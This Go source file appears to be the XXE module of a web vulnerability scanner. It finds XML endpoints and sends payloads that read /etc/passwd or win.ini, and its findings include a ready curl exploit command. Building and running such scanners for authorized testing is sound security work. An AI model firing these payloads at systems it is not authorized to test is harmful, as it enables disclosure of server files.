// Package xxe probes XML-accepting endpoints for XML External Entity (XXE)
// injection vulnerabilities.
//
// It discovers XML endpoints by probing common API paths with a Content-Type
// of application/xml or text/xml, then injects XXE payloads and checks whether
// the server echoes /etc/passwd content or internal file data in its response.
//
// Active exploitation probes require ScanAuthorized mode (--authorized flag).
// ScanAuthorized only (active payloads that attempt file reads).
package xxe

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/stormbane/beacon/internal/finding"
	"github.com/stormbane/beacon/internal/module"
	"github.com/stormbane/beacon/internal/scanner/schemedetect"
)

const (
	scannerName = "xxe"
	maxBodySize = 64 * 1024
)

// xmlProbeBody is a minimal XML document sent to detect XML parsing.
const xmlProbeBody = `<?xml version="1.0" encoding="UTF-8"?><probe><test>beacon</test></probe>`

// xxePayloads are XXE injection documents targeting common file disclosure paths.
var xxePayloads = []struct {
	name    string
	payload string
	// indicator is a string expected in the response if XXE succeeded.
	indicator string
}{
	{
		name: "Linux /etc/passwd",
		payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`,
		indicator: "root:",
	},
	{
		name: "Windows win.ini",
		payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<root><data>&xxe;</data></root>`,
		indicator: "[fonts]",
	},
}

// xmlPaths are common API paths likely to accept XML input.
var xmlPaths = []string{
	"/api",
	"/api/v1",
	"/api/v2",
	"/upload",
	"/import",
	"/parse",
	"/process",
	"/soap",
	"/ws",
	"/webservice",
	"/xml",
	"/rss",
	"/feed",
	"/sitemap.xml",
}

// xmlContentTypes are MIME types to try for XML submissions.
var xmlContentTypes = []string{
	"application/xml",
	"text/xml",
}

// Scanner probes for XXE injection vulnerabilities.
type Scanner struct{}

// New returns a new Scanner.
func New() *Scanner { return &Scanner{} }

// Name returns the stable scanner identifier.
func (s *Scanner) Name() string { return scannerName }

// Run executes the XXE scan. Deep mode only.
func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	// Exploitation probes require --authorized (beyond --deep).
	if scanType != module.ScanAuthorized {
		return nil, nil
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	base := schemedetect.Base(ctx, client, asset)

	// Phase 1: discover XML-accepting endpoints.
	xmlEndpoints := discoverXMLEndpoints(ctx, client, base)
	if len(xmlEndpoints) == 0 {
		return nil, nil
	}

	var findings []finding.Finding

	for _, endpoint := range xmlEndpoints {
		for _, p := range xxePayloads {
			f := probeXXE(ctx, client, asset, endpoint, p.name, p.payload, p.indicator)
			if f != nil {
				findings = append(findings, *f)
				// One finding per endpoint is sufficient.
				break
			}
		}
		if ctx.Err() != nil {
			break
		}
	}

	return findings, nil
}

// discoverXMLEndpoints finds paths that respond to XML POST requests.
func discoverXMLEndpoints(ctx context.Context, client *http.Client, base string) []string {
	var endpoints []string
	for _, path := range xmlPaths {
		endpointURL := base + path
		for _, ct := range xmlContentTypes {
			req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpointURL,
				bytes.NewBufferString(xmlProbeBody))
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", ct)
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 4*1024))
			resp.Body.Close()

			// Accept only if the response gives strong signals of XML processing:
			//   (a) response Content-Type is XML or SOAP, OR
			//   (b) response body contains XML-like markup.
			// This avoids false positives from SPA catch-all routes that return
			// 200 for every path regardless of content-type.
			respCT := resp.Header.Get("Content-Type")
			xmlCT := strings.Contains(respCT, "xml") || strings.Contains(respCT, "soap")
			bodyStr := string(body)
			xmlBody := strings.Contains(bodyStr, "<?xml") ||
				strings.Contains(bodyStr, "<soap:") ||
				strings.Contains(bodyStr, "<SOAP") ||
				(strings.Contains(bodyStr, "<?") && strings.Contains(bodyStr, "?>"))

			validStatus := resp.StatusCode >= 200 && resp.StatusCode < 500 &&
				resp.StatusCode != http.StatusNotFound &&
				resp.StatusCode != http.StatusMethodNotAllowed &&
				resp.StatusCode != http.StatusNotImplemented

			if validStatus && (xmlCT || xmlBody) {
				endpoints = append(endpoints, endpointURL)
				break
			}
		}
		if ctx.Err() != nil {
			break
		}
	}
	return endpoints
}

// probeXXE sends an XXE payload to an endpoint and checks for the indicator.
func probeXXE(ctx context.Context, client *http.Client, asset, url, payloadName, payload, indicator string) *finding.Finding {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url,
		bytes.NewBufferString(payload))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/xml")

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
	resp.Body.Close()

	if !strings.Contains(string(body), indicator) {
		return nil
	}

	return &finding.Finding{
		CheckID:  finding.CheckWebXXE,
		Module:   "deep",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("XML External Entity (XXE) Injection — %s", payloadName),
		Description: fmt.Sprintf(
			"The endpoint %s processed an XML External Entity reference and returned file contents. "+
				"XXE can be used to read arbitrary files from the server filesystem, perform "+
				"server-side request forgery (SSRF), or execute denial-of-service attacks.",
			url),
		Asset:    asset,
		DeepOnly: true,
		ProofCommand: fmt.Sprintf(
			`curl -s -X POST '%s' -H 'Content-Type: application/xml' `+
				`-d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' | grep 'root:'`,
			url),
		Evidence: map[string]any{
			"url":       url,
			"payload":   payloadName,
			"indicator": indicator,
		},
		DiscoveredAt: time.Now(),
	}
}

